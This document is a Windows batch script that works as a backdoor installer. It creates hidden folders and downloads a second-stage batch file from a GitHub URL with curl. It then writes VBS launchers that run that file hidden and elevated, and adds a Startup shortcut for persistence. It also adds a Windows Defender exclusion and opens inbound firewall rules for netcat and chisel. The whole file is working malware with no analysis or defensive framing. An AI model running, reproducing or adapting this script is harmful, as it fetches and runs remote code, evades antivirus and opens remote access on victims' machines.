@echo off
mkdir %userprofile%\Akuma
attrib +h %userprofile%\Akuma
mkdir %homedrive%\ShiniGami
attrib +h %homedrive%\ShiniGami
curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\ShiniGami\Akuma.bat
del %userprofile%\Akuma\死神.vbs
echo Set objShell = CreateObject("WScript.Shell") >> %userprofile%\Akuma\死神.vbs
echo objShell.Run "%homedrive%\ShiniGami\Akuma.bat", 0, False >> %userprofile%\Akuma\死神.vbs
del %userprofile%\Akuma\beyondbirthday.vbs
echo Set objShell = CreateObject("Shell.Application") >> %userprofile%\Akuma\beyondbirthday.vbs
echo objShell.ShellExecute "%userprofile%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %userprofile%\Akuma\beyondbirthday.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%userprofile%\Akuma\beyondbirthday.vbs';$s.Save()"
echo powershell Add-MpPreference -ExclusionPath "$env:userprofile\Akuma" >> %userprofile%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %userprofile%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%userprofile%\Akuma\nc\nc.exe" -Action Allow >> %userprofile%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %userprofile%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%userprofile%\Akuma\chisel.exe" -Action Allow >> %userprofile%\Akuma\beyondbirthday.bat
echo start %userprofile%\Akuma\死神.vbs >> %userprofile%\Akuma\beyondbirthday.bat
echo del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\beyondbirthday.lnk" >> %userprofile%\Akuma\beyondbirthday.bat
set "vbsFilePath=%userprofile%\Akuma\beyondbirthday.vbs"
IF EXIST "%vbsFilePath%" (
    cscript "%vbsFilePath%"
) ELSE (
    exit
)
exit
